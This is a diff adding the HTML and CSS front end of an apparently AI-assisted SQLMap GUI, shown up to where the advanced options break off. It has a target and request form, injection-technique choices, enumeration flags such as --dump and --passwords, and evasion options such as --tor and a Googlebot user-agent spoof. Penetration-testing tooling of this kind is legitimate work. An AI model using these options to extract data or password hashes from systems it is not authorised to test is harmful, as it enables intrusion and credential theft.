@@ -1,0 +1,1881 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>SQLMap GUI — AI Powered</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@400;700;900&display=swap');
+
+:root {
+  --bg0: #070b14;
+  --bg1: #0d1221;
+  --bg2: #111827;
+  --bg3: #1a2235;
+  --border: #1e3a5f;
+  --border-bright: #0ea5e9;
+  --accent: #00d4ff;
+  --accent2: #7c3aed;
+  --accent3: #f59e0b;
+  --danger: #ef4444;
+  --success: #22c55e;
+  --warn: #f59e0b;
+  --text: #c8d8f0;
+  --text-dim: #5a7a9a;
+  --text-bright: #e8f4ff;
+  --mono: 'Share Tech Mono', monospace;
+  --ui: 'Rajdhani', sans-serif;
+  --display: 'Orbitron', sans-serif;
+  --glow: 0 0 20px rgba(0,212,255,0.3);
+  --glow-strong: 0 0 40px rgba(0,212,255,0.5);
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+html, body { height: 100%; overflow: hidden; }
+
+body {
+  font-family: var(--ui);
+  background: var(--bg0);
+  color: var(--text);
+  display: flex;
+  flex-direction: column;
+  position: relative;
+}
+
+/* Animated grid background */
+body::before {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background-image:
+    linear-gradient(rgba(0,212,255,0.03) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(0,212,255,0.03) 1px, transparent 1px);
+  background-size: 40px 40px;
+  pointer-events: none;
+  z-index: 0;
+}
+
+/* ─── Titlebar ──────────────────────────────────────────── */
+#titlebar {
+  -webkit-app-region: drag;
+  height: 42px;
+  background: var(--bg1);
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  padding: 0 16px;
+  gap: 12px;
+  flex-shrink: 0;
+  z-index: 100;
+  position: relative;
+}
+
+#titlebar-logo {
+  font-family: var(--display);
+  font-size: 13px;
+  font-weight: 700;
+  color: var(--accent);
+  letter-spacing: 2px;
+  text-shadow: var(--glow);
+  -webkit-app-region: no-drag;
+}
+#titlebar-logo span { color: var(--danger); }
+
+.titlebar-badge {
+  font-family: var(--mono);
+  font-size: 10px;
+  color: var(--text-dim);
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  padding: 2px 8px;
+  border-radius: 2px;
+}
+
+#titlebar-spacer { flex: 1; }
+
+#titlebar-status {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 11px;
+  color: var(--text-dim);
+  font-family: var(--mono);
+}
+#status-dot {
+  width: 7px; height: 7px;
+  border-radius: 50%;
+  background: var(--text-dim);
+  transition: all 0.3s;
+}
+#status-dot.running { background: var(--success); box-shadow: 0 0 8px var(--success); animation: pulse 1s infinite; }
+#status-dot.error { background: var(--danger); }
+
+@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
+
+.window-btn {
+  -webkit-app-region: no-drag;
+  width: 28px; height: 28px;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 14px;
+  transition: all 0.15s;
+  background: transparent;
+  color: var(--text-dim);
+}
+.window-btn:hover { background: var(--bg3); color: var(--text-bright); }
+#btn-close:hover { background: var(--danger); color: white; }
+
+/* ─── Layout ────────────────────────────────────────────── */
+#app {
+  display: flex;
+  flex: 1;
+  overflow: hidden;
+  position: relative;
+  z-index: 1;
+}
+
+/* ─── Sidebar ───────────────────────────────────────────── */
+#sidebar {
+  width: 240px;
+  flex-shrink: 0;
+  background: var(--bg1);
+  border-right: 1px solid var(--border);
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+}
+
+.sidebar-section {
+  border-bottom: 1px solid var(--border);
+  padding: 12px 0;
+}
+
+.sidebar-label {
+  font-family: var(--display);
+  font-size: 9px;
+  letter-spacing: 3px;
+  color: var(--text-dim);
+  padding: 0 16px 8px;
+}
+
+.nav-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 8px 16px;
+  cursor: pointer;
+  font-size: 13px;
+  font-weight: 600;
+  color: var(--text-dim);
+  transition: all 0.15s;
+  border-left: 2px solid transparent;
+  user-select: none;
+}
+.nav-item:hover { color: var(--text); background: rgba(0,212,255,0.05); }
+.nav-item.active {
+  color: var(--accent);
+  background: rgba(0,212,255,0.08);
+  border-left-color: var(--accent);
+}
+.nav-item .icon { width: 16px; text-align: center; font-size: 14px; }
+
+#history-list {
+  flex: 1;
+  overflow-y: auto;
+  padding: 8px 0;
+}
+#history-list::-webkit-scrollbar { width: 4px; }
+#history-list::-webkit-scrollbar-track { background: transparent; }
+#history-list::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+
+.history-item {
+  padding: 8px 16px;
+  cursor: pointer;
+  border-left: 2px solid transparent;
+  transition: all 0.15s;
+}
+.history-item:hover { background: rgba(0,212,255,0.05); border-left-color: var(--border-bright); }
+.history-item .h-url { font-family: var(--mono); font-size: 10px; color: var(--text); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.history-item .h-time { font-size: 10px; color: var(--text-dim); margin-top: 2px; }
+.history-item .h-status { display: inline-block; width: 6px; height: 6px; border-radius: 50%; margin-right: 4px; }
+.history-item .h-status.vuln { background: var(--danger); }
+.history-item .h-status.clean { background: var(--success); }
+.history-item .h-status.pending { background: var(--warn); }
+
+/* ─── Main Content ──────────────────────────────────────── */
+#main {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+}
+
+/* Tab bar */
+#tabs {
+  display: flex;
+  align-items: center;
+  background: var(--bg1);
+  border-bottom: 1px solid var(--border);
+  padding: 0 16px;
+  gap: 4px;
+  height: 40px;
+  flex-shrink: 0;
+}
+
+.tab {
+  padding: 0 16px;
+  height: 32px;
+  display: flex; align-items: center; gap: 6px;
+  font-size: 12px;
+  font-weight: 600;
+  letter-spacing: 0.5px;
+  color: var(--text-dim);
+  cursor: pointer;
+  border-bottom: 2px solid transparent;
+  transition: all 0.15s;
+  white-space: nowrap;
+}
+.tab:hover { color: var(--text); }
+.tab.active { color: var(--accent); border-bottom-color: var(--accent); }
+
+/* Panels */
+.panel { display: none; flex: 1; overflow: hidden; flex-direction: column; }
+.panel.active { display: flex; }
+
+/* ─── SCAN PANEL ────────────────────────────────────────── */
+#panel-scan {
+  display: flex;
+  flex-direction: row;
+  flex: 1;
+  overflow: hidden;
+}
+
+/* Config column */
+#config-col {
+  width: 380px;
+  flex-shrink: 0;
+  background: var(--bg1);
+  border-right: 1px solid var(--border);
+  overflow-y: auto;
+  padding: 0;
+}
+#config-col::-webkit-scrollbar { width: 4px; }
+#config-col::-webkit-scrollbar-thumb { background: var(--border); }
+
+.config-section {
+  border-bottom: 1px solid var(--border);
+  padding: 16px;
+}
+
+.config-section-title {
+  font-family: var(--display);
+  font-size: 9px;
+  letter-spacing: 3px;
+  color: var(--accent);
+  margin-bottom: 12px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.config-section-title::after {
+  content: '';
+  flex: 1;
+  height: 1px;
+  background: linear-gradient(90deg, var(--border), transparent);
+}
+
+.field { margin-bottom: 12px; }
+.field label {
+  display: block;
+  font-size: 11px;
+  font-weight: 600;
+  color: var(--text-dim);
+  margin-bottom: 4px;
+  letter-spacing: 0.5px;
+}
+.field-row { display: flex; gap: 8px; }
+
+input[type="text"], input[type="number"], select, textarea {
+  width: 100%;
+  background: var(--bg0);
+  border: 1px solid var(--border);
+  color: var(--text);
+  padding: 7px 10px;
+  font-family: var(--mono);
+  font-size: 12px;
+  border-radius: 4px;
+  outline: none;
+  transition: all 0.2s;
+}
+input[type="text"]:focus, input[type="number"]:focus, select:focus, textarea:focus {
+  border-color: var(--accent);
+  box-shadow: 0 0 0 2px rgba(0,212,255,0.1);
+}
+select option { background: var(--bg2); }
+input[type="number"] { width: 80px; }
+
+.checkbox-group { display: flex; flex-wrap: wrap; gap: 8px; }
+.cb-item {
+  display: flex; align-items: center; gap: 5px;
+  font-size: 11px; color: var(--text);
+  cursor: pointer;
+  padding: 4px 8px;
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 3px;
+  transition: all 0.15s;
+  user-select: none;
+}
+.cb-item:hover { border-color: var(--accent); }
+.cb-item input { accent-color: var(--accent); }
+.cb-item.checked { border-color: var(--accent); background: rgba(0,212,255,0.08); color: var(--accent); }
+
+.btn {
+  display: inline-flex; align-items: center; gap: 6px;
+  padding: 8px 16px;
+  border: 1px solid;
+  border-radius: 4px;
+  font-family: var(--display);
+  font-size: 11px;
+  font-weight: 700;
+  letter-spacing: 1px;
+  cursor: pointer;
+  transition: all 0.2s;
+  text-transform: uppercase;
+}
+.btn-primary {
+  background: linear-gradient(135deg, #0ea5e9, #0284c7);
+  border-color: var(--accent);
+  color: white;
+  box-shadow: 0 0 20px rgba(0,212,255,0.2);
+}
+.btn-primary:hover { box-shadow: var(--glow-strong); transform: translateY(-1px); }
+.btn-danger {
+  background: rgba(239,68,68,0.1);
+  border-color: var(--danger);
+  color: var(--danger);
+}
+.btn-danger:hover { background: var(--danger); color: white; }
+.btn-ghost {
+  background: transparent;
+  border-color: var(--border);
+  color: var(--text-dim);
+}
+.btn-ghost:hover { border-color: var(--accent); color: var(--accent); }
+.btn-ai {
+  background: linear-gradient(135deg, #7c3aed, #6d28d9);
+  border-color: #7c3aed;
+  color: white;
+  box-shadow: 0 0 20px rgba(124,58,237,0.3);
+}
+.btn-ai:hover { box-shadow: 0 0 30px rgba(124,58,237,0.5); transform: translateY(-1px); }
+.btn-warn {
+  background: rgba(245,158,11,0.1);
+  border-color: var(--warn);
+  color: var(--warn);
+}
+.btn-warn:hover { background: var(--warn); color: #000; }
+
+.btn-full { width: 100%; justify-content: center; }
+.btn:disabled { opacity: 0.4; cursor: not-allowed; transform: none !important; }
+
+.btn-row { display: flex; gap: 8px; }
+
+/* Output column */
+#output-col {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+}
+
+#output-header {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 10px 16px;
+  border-bottom: 1px solid var(--border);
+  background: var(--bg1);
+  flex-shrink: 0;
+}
+#output-header-title {
+  font-family: var(--display);
+  font-size: 10px;
+  letter-spacing: 2px;
+  color: var(--accent);
+}
+#output-header-spacer { flex: 1; }
+
+#terminal {
+  flex: 1;
+  overflow-y: auto;
+  padding: 16px;
+  font-family: var(--mono);
+  font-size: 12px;
+  line-height: 1.6;
+  background: var(--bg0);
+}
+#terminal::-webkit-scrollbar { width: 6px; }
+#terminal::-webkit-scrollbar-track { background: var(--bg1); }
+#terminal::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+
+.term-line { white-space: pre-wrap; word-break: break-all; }
+.term-stdout { color: #94a3b8; }
+.term-stderr { color: #fca5a5; }
+.term-error { color: var(--danger); font-weight: bold; }
+.term-system { color: var(--warn); }
+.term-success { color: var(--success); }
+.term-vuln { color: var(--danger); text-shadow: 0 0 8px var(--danger); font-weight: bold; }
+.term-info { color: var(--accent); }
+.term-cmd { color: var(--accent2); }
+.term-banner {
+  color: var(--accent);
+  text-shadow: var(--glow);
+  border: 1px solid var(--border);
+  padding: 12px 16px;
+  margin-bottom: 12px;
+  border-radius: 4px;
+  background: rgba(0,212,255,0.03);
+}
+
+/* Command preview */
+#cmd-preview {
+  background: var(--bg1);
+  border-top: 1px solid var(--border);
+  padding: 10px 16px;
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--text-dim);
+  flex-shrink: 0;
+}
+#cmd-preview span { color: var(--accent2); }
+
+/* ─── AI PANEL ──────────────────────────────────────────── */
+#panel-ai {
+  flex-direction: row;
+}
+
+#ai-left {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+}
+
+#ai-right {
+  width: 320px;
+  flex-shrink: 0;
+  border-left: 1px solid var(--border);
+  background: var(--bg1);
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+}
+
+#ai-messages {
+  flex: 1;
+  overflow-y: auto;
+  padding: 20px;
+  display: flex;
+  flex-direction: column;
+  gap: 16px;
+}
+#ai-messages::-webkit-scrollbar { width: 4px; }
+#ai-messages::-webkit-scrollbar-thumb { background: var(--border); }
+
+.ai-msg {
+  max-width: 85%;
+  animation: msgIn 0.3s ease;
+}
+@keyframes msgIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+.ai-msg.user { align-self: flex-end; }
+.ai-msg.assistant { align-self: flex-start; }
+
+.ai-bubble {
+  padding: 12px 16px;
+  border-radius: 8px;
+  font-size: 13px;
+  line-height: 1.6;
+}
+.ai-msg.user .ai-bubble {
+  background: linear-gradient(135deg, rgba(124,58,237,0.3), rgba(109,40,217,0.2));
+  border: 1px solid rgba(124,58,237,0.4);
+  color: var(--text-bright);
+}
+.ai-msg.assistant .ai-bubble {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  color: var(--text);
+}
+.ai-bubble code {
+  font-family: var(--mono);
+  font-size: 11px;
+  background: var(--bg0);
+  padding: 1px 5px;
+  border-radius: 3px;
+  color: var(--accent);
+}
+.ai-bubble pre {
+  font-family: var(--mono);
+  font-size: 11px;
+  background: var(--bg0);
+  padding: 10px;
+  border-radius: 4px;
+  margin: 8px 0;
+  border: 1px solid var(--border);
+  overflow-x: auto;
+  color: var(--accent);
+  line-height: 1.5;
+}
+
+.ai-role {
+  font-size: 10px;
+  font-weight: 700;
+  letter-spacing: 1px;
+  margin-bottom: 4px;
+  font-family: var(--display);
+}
+.ai-msg.user .ai-role { color: #a78bfa; text-align: right; }
+.ai-msg.assistant .ai-role { color: var(--accent); }
+
+.ai-thinking {
+  display: flex; gap: 4px; align-items: center;
+  padding: 12px 16px;
+}
+.ai-thinking span {
+  width: 6px; height: 6px; border-radius: 50%;
+  background: var(--accent);
+  animation: thinking 1.2s infinite;
+}
+.ai-thinking span:nth-child(2) { animation-delay: 0.2s; }
+.ai-thinking span:nth-child(3) { animation-delay: 0.4s; }
+@keyframes thinking { 0%,80%,100%{opacity:0.2;transform:scale(0.8)} 40%{opacity:1;transform:scale(1)} }
+
+#ai-input-row {
+  display: flex;
+  gap: 8px;
+  padding: 12px 16px;
+  border-top: 1px solid var(--border);
+  background: var(--bg1);
+  flex-shrink: 0;
+}
+#ai-input {
+  flex: 1;
+  resize: none;
+  height: 60px;
+  padding: 8px 12px;
+}
+
+/* AI right panel */
+.ai-panel-title {
+  font-family: var(--display);
+  font-size: 9px;
+  letter-spacing: 3px;
+  color: var(--accent);
+  padding: 12px 16px;
+  border-bottom: 1px solid var(--border);
+}
+
+.quick-btn {
+  display: block;
+  width: 100%;
+  text-align: left;
+  padding: 10px 14px;
+  font-size: 12px;
+  font-family: var(--ui);
+  font-weight: 600;
+  color: var(--text);
+  background: transparent;
+  border: none;
+  border-bottom: 1px solid var(--border);
+  cursor: pointer;
+  transition: all 0.15s;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.quick-btn:hover { background: rgba(0,212,255,0.05); color: var(--accent); }
+.quick-btn .qicon { font-size: 14px; }
+
+#api-key-section {
+  padding: 16px;
+  border-top: 1px solid var(--border);
+  margin-top: auto;
+}
+#api-key-section label {
+  font-size: 10px;
+  letter-spacing: 1px;
+  color: var(--text-dim);
+  display: block;
+  margin-bottom: 6px;
+  font-weight: 600;
+}
+.api-key-row { display: flex; gap: 6px; }
+#apiKeyInput { font-size: 11px; flex: 1; }
+
+/* ─── RESULTS PANEL ─────────────────────────────────────── */
+#panel-results {
+  flex-direction: column;
+  padding: 20px;
+  overflow-y: auto;
+  gap: 16px;
+}
+#panel-results::-webkit-scrollbar { width: 6px; }
+#panel-results::-webkit-scrollbar-thumb { background: var(--border); }
+
+.results-empty {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  flex: 1;
+  color: var(--text-dim);
+  gap: 12px;
+}
+.results-empty .big-icon { font-size: 48px; opacity: 0.3; }
+.results-empty p { font-size: 14px; }
+
+.vuln-card {
+  background: var(--bg1);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  overflow: hidden;
+  animation: cardIn 0.4s ease;
+}
+@keyframes cardIn { from { opacity: 0; transform: translateY(10px); } }
+
+.vuln-card-header {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 14px 16px;
+  border-bottom: 1px solid var(--border);
+  cursor: pointer;
+  user-select: none;
+}
+.vuln-card-header:hover { background: rgba(255,255,255,0.02); }
+.vuln-severity {
+  font-family: var(--display);
+  font-size: 9px;
+  font-weight: 700;
+  letter-spacing: 2px;
+  padding: 3px 8px;
+  border-radius: 2px;
+}
+.sev-critical { background: rgba(239,68,68,0.2); color: var(--danger); border: 1px solid var(--danger); }
+.sev-high { background: rgba(239,68,68,0.1); color: #fb923c; border: 1px solid #fb923c; }
+.sev-medium { background: rgba(245,158,11,0.1); color: var(--warn); border: 1px solid var(--warn); }
+.sev-low { background: rgba(34,197,94,0.1); color: var(--success); border: 1px solid var(--success); }
+.vuln-type { font-weight: 700; font-size: 14px; color: var(--text-bright); }
+.vuln-param { font-family: var(--mono); font-size: 11px; color: var(--accent); }
+.vuln-card-spacer { flex: 1; }
+.vuln-toggle { color: var(--text-dim); font-size: 16px; transition: transform 0.2s; }
+.vuln-toggle.open { transform: rotate(180deg); }
+
+.vuln-card-body { padding: 16px; display: none; }
+.vuln-card-body.open { display: block; }
+.vuln-detail { display: grid; grid-template-columns: 140px 1fr; gap: 6px 12px; font-size: 12px; }
+.vuln-detail dt { color: var(--text-dim); font-weight: 600; }
+.vuln-detail dd { color: var(--text); font-family: var(--mono); }
+
+/* ─── PAYLOADS PANEL ─────────────────────────────────────── */
+#panel-payloads {
+  flex-direction: column;
+  overflow: hidden;
+}
+#payload-content { flex: 1; display: flex; overflow: hidden; }
+#payload-categories {
+  width: 200px;
+  flex-shrink: 0;
+  border-right: 1px solid var(--border);
+  background: var(--bg1);
+  overflow-y: auto;
+  padding: 12px 0;
+}
+.payload-cat {
+  padding: 8px 16px;
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--text-dim);
+  cursor: pointer;
+  border-left: 2px solid transparent;
+  transition: all 0.15s;
+}
+.payload-cat:hover { color: var(--text); }
+.payload-cat.active { color: var(--accent); border-left-color: var(--accent); background: rgba(0,212,255,0.05); }
+
+#payload-list {
+  flex: 1;
+  overflow-y: auto;
+  padding: 16px;
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+}
+#payload-list::-webkit-scrollbar { width: 4px; }
+#payload-list::-webkit-scrollbar-thumb { background: var(--border); }
+
+.payload-item {
+  background: var(--bg1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 12px;
+  cursor: pointer;
+  transition: all 0.15s;
+  position: relative;
+}
+.payload-item:hover { border-color: var(--accent); background: rgba(0,212,255,0.03); }
+.payload-item.copied { border-color: var(--success); }
+.payload-name { font-size: 12px; font-weight: 700; color: var(--text-bright); margin-bottom: 4px; }
+.payload-code {
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--accent);
+  background: var(--bg0);
+  padding: 6px 10px;
+  border-radius: 3px;
+  margin: 6px 0;
+  word-break: break-all;
+}
+.payload-desc { font-size: 11px; color: var(--text-dim); }
+.payload-copy {
+  position: absolute;
+  top: 8px; right: 8px;
+  font-size: 10px;
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  color: var(--text-dim);
+  padding: 2px 8px;
+  border-radius: 2px;
+  cursor: pointer;
+  font-family: var(--mono);
+}
+.payload-copy:hover { color: var(--accent); border-color: var(--accent); }
+
+/* Panel headers */
+.panel-header {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 12px 20px;
+  border-bottom: 1px solid var(--border);
+  background: var(--bg1);
+  flex-shrink: 0;
+}
+.panel-header-title {
+  font-family: var(--display);
+  font-size: 11px;
+  letter-spacing: 2px;
+  color: var(--accent);
+}
+.panel-header-spacer { flex: 1; }
+
+/* ─── Notifications ─────────────────────────────────────── */
+#notif-container {
+  position: fixed;
+  bottom: 20px;
+  right: 20px;
+  z-index: 9999;
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+}
+.notif {
+  padding: 10px 16px;
+  border-radius: 6px;
+  font-size: 12px;
+  font-family: var(--ui);
+  font-weight: 600;
+  border: 1px solid;
+  animation: notifIn 0.3s ease;
+  max-width: 320px;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+}
+@keyframes notifIn { from { opacity:0; transform: translateX(20px); } }
+.notif-success { background: rgba(34,197,94,0.1); border-color: var(--success); color: var(--success); }
+.notif-error { background: rgba(239,68,68,0.1); border-color: var(--danger); color: var(--danger); }
+.notif-info { background: rgba(0,212,255,0.1); border-color: var(--accent); color: var(--accent); }
+.notif-warn { background: rgba(245,158,11,0.1); border-color: var(--warn); color: var(--warn); }
+
+/* Scrollbar global */
+::-webkit-scrollbar { width: 6px; height: 6px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+
+/* Tooltips */
+[title]:hover::after {
+  content: attr(title);
+  position: absolute;
+  bottom: 110%;
+  left: 50%;
+  transform: translateX(-50%);
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  color: var(--text);
+  font-size: 10px;
+  padding: 4px 8px;
+  border-radius: 3px;
+  white-space: nowrap;
+  pointer-events: none;
+}
+</style>
+</head>
+<body>
+
+<!-- Titlebar -->
+<div id="titlebar">
+  <div id="titlebar-logo">SQL<span>M</span>AP <span style="color:var(--accent2)">▸</span> GUI</div>
+  <div class="titlebar-badge">AI POWERED</div>
+  <div class="titlebar-badge" id="sqlmap-version">SQLMAP v1.x</div>
+  <div id="titlebar-spacer"></div>
+  <div id="titlebar-status">
+    <div id="status-dot"></div>
+    <span id="status-text">IDLE</span>
+  </div>
+  <button class="window-btn" onclick="window.sqlmapAPI.minimize()">─</button>
+  <button class="window-btn" onclick="window.sqlmapAPI.maximize()">□</button>
+  <button class="window-btn" id="btn-close" onclick="window.sqlmapAPI.close()">✕</button>
+</div>
+
+<div id="app">
+  <!-- Sidebar -->
+  <div id="sidebar">
+    <div class="sidebar-section">
+      <div class="sidebar-label">NAVIGATION</div>
+      <div class="nav-item active" onclick="switchTab('scan')" id="nav-scan">
+        <span class="icon">⚡</span> Scan
+      </div>
+      <div class="nav-item" onclick="switchTab('ai')" id="nav-ai">
+        <span class="icon">🤖</span> AI Assistant
+      </div>
+      <div class="nav-item" onclick="switchTab('results')" id="nav-results">
+        <span class="icon">🎯</span> Results
+        <span id="vuln-badge" style="margin-left:auto;font-family:var(--mono);font-size:10px;color:var(--danger);display:none">0</span>
+      </div>
+      <div class="nav-item" onclick="switchTab('payloads')" id="nav-payloads">
+        <span class="icon">💉</span> Payloads
+      </div>
+    </div>
+    <div class="sidebar-section" style="flex:1;overflow:hidden;display:flex;flex-direction:column">
+      <div class="sidebar-label">SCAN HISTORY</div>
+      <div id="history-list">
+        <div style="padding:16px;font-size:11px;color:var(--text-dim);text-align:center">No scans yet</div>
+      </div>
+    </div>
+    <div class="sidebar-section" style="padding:12px 16px">
+      <button class="btn btn-ghost btn-full" style="font-size:10px" onclick="saveSession()">💾 Save Session</button>
+      <div style="height:6px"></div>
+      <button class="btn btn-ghost btn-full" style="font-size:10px" onclick="loadSession()">📂 Load Session</button>
+    </div>
+  </div>
+
+  <!-- Main -->
+  <div id="main">
+    <!-- Tabs -->
+    <div id="tabs">
+      <div class="tab active" id="tab-scan" onclick="switchTab('scan')">⚡ SCAN CONFIG</div>
+      <div class="tab" id="tab-ai" onclick="switchTab('ai')">🤖 AI ASSISTANT</div>
+      <div class="tab" id="tab-results" onclick="switchTab('results')">🎯 RESULTS</div>
+      <div class="tab" id="tab-payloads" onclick="switchTab('payloads')">💉 PAYLOADS</div>
+    </div>
+
+    <!-- ─── SCAN PANEL ─────────────────────────────────── -->
+    <div class="panel active" id="panel-scan">
+      <!-- Config Column -->
+      <div id="config-col">
+
+        <div class="config-section">
+          <div class="config-section-title">TARGET</div>
+          <div class="field">
+            <label>URL *</label>
+            <div class="field-row">
+              <input type="text" id="targetUrl" placeholder="https://target.com/page?id=1" />
+            </div>
+          </div>
+          <div class="field">
+            <label>REQUEST FILE</label>
+            <div class="field-row">
+              <input type="text" id="requestFile" placeholder="burp_request.txt" readonly />
+              <button class="btn btn-ghost" style="white-space:nowrap;font-size:10px" onclick="browseFile('requestFile')">Browse</button>
+            </div>
+          </div>
+          <div class="field">
+            <label>HTTP METHOD</label>
+            <select id="method">
+              <option>GET</option><option>POST</option><option>PUT</option><option>DELETE</option>
+            </select>
+          </div>
+          <div class="field">
+            <label>POST DATA</label>
+            <textarea id="postData" style="height:50px;resize:vertical" placeholder="param1=val1&param2=val2"></textarea>
+          </div>
+        </div>
+
+        <div class="config-section">
+          <div class="config-section-title">INJECTION</div>
+          <div class="field">
+            <label>PARAMETER(S)</label>
+            <input type="text" id="param" placeholder="id, user, search (comma separated)" />
+          </div>
+          <div class="field">
+            <label>TECHNIQUE(S)</label>
+            <div class="checkbox-group" id="techniques">
+              <label class="cb-item"><input type="checkbox" value="B" checked onchange="updateCbStyle(this)"> Boolean</label>
+              <label class="cb-item"><input type="checkbox" value="E" onchange="updateCbStyle(this)"> Error</label>
+              <label class="cb-item"><input type="checkbox" value="U" onchange="updateCbStyle(this)"> Union</label>
+              <label class="cb-item"><input type="checkbox" value="S" onchange="updateCbStyle(this)"> Stacked</label>
+              <label class="cb-item"><input type="checkbox" value="T" checked onchange="updateCbStyle(this)"> Time</label>
+              <label class="cb-item"><input type="checkbox" value="Q" onchange="updateCbStyle(this)"> Inline</label>
+            </div>
+          </div>
+          <div class="field">
+            <label>DBMS</label>
+            <select id="dbms">
+              <option value="">Auto-detect</option>
+              <option>MySQL</option><option>PostgreSQL</option><option>Microsoft SQL Server</option>
+              <option>Oracle</option><option>SQLite</option><option>Microsoft Access</option>
+              <option>Firebird</option><option>Sybase</option><option>SAP MaxDB</option>
+            </select>
+          </div>
+          <div class="field-row">
+            <div class="field" style="flex:1">
+              <label>LEVEL (1-5)</label>
+              <input type="number" id="level" value="1" min="1" max="5" />
+            </div>
+            <div class="field" style="flex:1">
+              <label>RISK (1-3)</label>
+              <input type="number" id="risk" value="1" min="1" max="3" />
+            </div>
+            <div class="field" style="flex:1">
+              <label>THREADS</label>
+              <input type="number" id="threads" value="1" min="1" max="10" />
+            </div>
+          </div>
+        </div>
+
+        <div class="config-section">
+          <div class="config-section-title">REQUEST</div>
+          <div class="field">
+            <label>COOKIE</label>
+            <input type="text" id="cookie" placeholder="session=abc123; token=xyz" />
+          </div>
+          <div class="field">
+            <label>USER-AGENT</label>
+            <select id="useragent">
+              <option value="">Default SQLMap</option>
+              <option value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36">Chrome (Windows)</option>
+              <option value="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36">Chrome (Mac)</option>
+              <option value="Googlebot/2.1 (+http://www.google.com/bot.html)">Googlebot</option>
+              <option value="custom">Custom...</option>
+            </select>
+          </div>
+          <div class="field">
+            <label>PROXY</label>
+            <input type="text" id="proxy" placeholder="http://127.0.0.1:8080" />
+          </div>
+          <div class="field">
+            <label>HEADERS (one per line)</label>
+            <textarea id="headers" style="height:50px;resize:vertical" placeholder="X-Forwarded-For: 127.0.0.1&#10;Referer: https://example.com"></textarea>
+          </div>
+          <div class="field">
+            <label>DELAY (seconds)</label>
+            <input type="number" id="delay" value="0" min="0" step="0.5" style="width:80px" />
+          </div>
+        </div>
+
+        <div class="config-section">
+          <div class="config-section-title">ENUMERATION</div>
+          <div class="checkbox-group">
+            <label class="cb-item"><input type="checkbox" id="getDbs" onchange="updateCbStyle(this)"> --dbs</label>
+            <label class="cb-item"><input type="checkbox" id="getCurrentDb" onchange="updateCbStyle(this)"> --current-db</label>
+            <label class="cb-item"><input type="checkbox" id="getCurrentUser" onchange="updateCbStyle(this)"> --current-user</label>
+            <label class="cb-item"><input type="checkbox" id="getHostname" onchange="updateCbStyle(this)"> --hostname</label>
+            <label class="cb-item"><input type="checkbox" id="getTables" onchange="updateCbStyle(this)"> --tables</label>
+            <label class="cb-item"><input type="checkbox" id="getColumns" onchange="updateCbStyle(this)"> --columns</label>
+            <label class="cb-item"><input type="checkbox" id="dumpAll" onchange="updateCbStyle(this)"> --dump</label>
+            <label class="cb-item"><input type="checkbox" id="isDba" onchange="updateCbStyle(this)"> --is-dba</label>
+            <label class="cb-item"><input type="checkbox" id="getPrivileges" onchange="updateCbStyle(this)"> --privileges</label>
+            <label class="cb-item"><input type="checkbox" id="getPasswords" onchange="updateCbStyle(this)"> --passwords</label>
+          </div>
+          <div class="field" style="margin-top:8px">
+            <label>TARGET DB</label>
+            <input type="text" id="targetDb" placeholder="target_database" />
+          </div>
+          <div class="field">
+            <label>TARGET TABLE</label>
+            <input type="text" id="targetTable" placeholder="users" />
+          </div>
+        </div>
+
+        <div class="config-section">
+          <div class="config-section-title">ADVANCED</div>
+          <div class="checkbox-group">
+            <label class="cb-item"><input type="checkbox" id="random_agent" onchange="updateCbStyle(this)"> --random-agent</label>
+            <label class="cb-item"><input type="checkbox" id="tor" onchange="updateCbStyle(this)"> --tor</label>
+            <label class="cb-item"><input type="checkbox" id="batch" checked onchange="updateCbStyle(this)"> --batch</label>
+            <label class="cb-item"><input type="checkbox" id="flush_session" onchange="updateCbStyle(this)"> --flush-session</label>
+            <label class="cb-item"><input type="checkbox" id="forms" onchange="updateCbStyle(this)"> --forms</label>
